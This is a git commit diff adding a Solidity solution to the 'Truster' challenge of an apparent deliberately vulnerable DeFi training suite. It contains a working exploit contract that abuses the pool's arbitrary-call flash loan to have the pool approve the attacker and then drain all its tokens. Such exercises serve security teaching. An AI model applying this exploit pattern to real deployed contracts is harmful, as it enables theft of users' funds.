ee353edd67da9ddbc53e3d883960043b1bdb2d03
vyeli <yeliv9527@gmail.com>
2024-08-31 20:24:00 -0300

    Truster solution

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -51,7 +51,16 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // The pool has a flashLoan function that allows anyone to borrow tokens with no fee
+        // it calls a function on a target address
+        // then check if the pool has the same amount of tokens after the call or more
+        // if it has less, the call failed and the transaction is reverted
+
+        // The goal is to drain the pool of all tokens and send them to the recovery account
+        // We can pass this test by approving all the tokens to the attacker contract when it is executing the target.functionCall(data) call 
+        // and then calling the transfer function to send all the tokens to the recovery account
+
+        Attack attackContract = new Attack(pool, recovery, token);
     }
 
     /**
@@ -65,4 +74,18 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+contract Attack {
+    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
+        // Call the flashLoan function with the attacker contract
+        // function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
+        uint256 amount = token.balanceOf(address(pool));
+        // notice that the target is the token address and the data is the approve function
+        // this will be called by the pool contract (target.functionCall(data)) = token.approve(address(this), amount)
+        pool.flashLoan(0, address(pool), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
+        // Transfer all the tokens to the recovery account using the allowance we got from the approve function
+        token.transferFrom(address(pool), recovery, amount);
+    }
+
 }
